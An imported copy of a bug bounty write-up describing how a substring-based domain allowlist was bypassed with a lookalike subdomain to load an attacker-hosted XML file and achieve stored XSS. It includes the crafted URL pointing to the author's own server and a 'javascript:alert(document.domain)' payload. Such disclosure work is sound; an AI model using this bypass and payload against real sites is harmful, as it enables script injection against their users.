---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-08-14_url-filter-bypass-rfi-and-xss.md
original_filename: 2022-08-14_url-filter-bypass-rfi-and-xss.md
title: URL filter bypass, RFI and XSS
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: 2dd1ae79afb1574b9e9af8ae61a518e4316020a7503f4a0463ac51b84adff28e
text_sha256: 15bad49d3ef14d27077922eb063e24cd499655db8b173f9ad51657015659c702
ingested_at: '2026-06-28T07:32:13Z'
sensitivity: unknown
redactions_applied: false
---

# URL filter bypass, RFI and XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-08-14_url-filter-bypass-rfi-and-xss.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:32:13Z
- Redactions Applied: False
- Raw SHA256: `2dd1ae79afb1574b9e9af8ae61a518e4316020a7503f4a0463ac51b84adff28e`
- Text SHA256: `15bad49d3ef14d27077922eb063e24cd499655db8b173f9ad51657015659c702`


## Content

---
title: "URL filter bypass, RFI and XSS"
page_title: "URL filter bypass, RFI and XSS - Bergee's Stories on Bug Hunting"
url: "https://bergee.it/blog/url-filter-bypass-rfi-and-xss/"
final_url: "https://bergee.it/blog/url-filter-bypass-rfi-and-xss/"
authors: ["Bartłomiej Bergier (@_bergee_)"]
bugs: ["Stored XSS", "RFI"]
publication_date: "2022-08-14"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2311
---

# URL filter bypass, RFI and XSS

Posted on [2022-08-142026-04-27](https://bergee.it/blog/url-filter-bypass-rfi-and-xss/) by [bergee](https://bergee.it/blog/author/bergee/)

In this story, I tell you how I was able to bypass the URL filtering rule to inject my own files into the server and eventually obtain stored XSS. As I can’t reveal the target let’s call it redacted.com. Using [waybackurls](https://github.com/tomnomnom/waybackurls) on the target I found the following URL:

> http://emp.redacted.com/embed.html?playlist=https://playlists.redacted.com/sport/0/football/34232917A/playlist.sxml

The playlist parameter was the URL to the XML file that delivered the data to render by the site. I immediately thought of injecting my own URL there. I tried but it only accepted the URL from *.redacted.com. After some trials and errors, I successfully bypassed the filter. It accepted the url from *.redacted.com.myowndomain.com. The filter did not check if the string is properly ended, it checked if the whitelisted domain is within the given domain of the remote URL. I had my own domain berdzi.tk. This way I registered the subdomain like this:

> redacted.com.berdzi.tk

ran my own server, put there my modified XML file there and put this url into browser:

> http://emp.redacted.com/embed.html?playlist=http://playlists.redacted.com.berdzi.tk/playlist.xml

My own playlist data were rendered properly. I obtained _Remote File Inclusion_**.** There were some placeholders in XML I could change but it didn’t do anything malicious. Suddenly I noticed the URL to the main site of redacted.com in the corner. And this URL was placed inside the XML file. If I changed it, I get _Open Redirect_ , however open redirect is not really dangerous. Fortunately there is a payload that allows to transform open redirect into XSS:

> javascript:alert(document.domain)

I put it into the XML and I obtained **stored XSS.** It required user’s interaction, though. But it was fully functional stored XSS which I was proud of and could attack anoter users with it.

![](https://bergee.it/blog/wp-content/uploads/2022/08/domain_filter_bypass_redacted-1024x789.jpg)

Reward: 👕

See you next bug 🙂
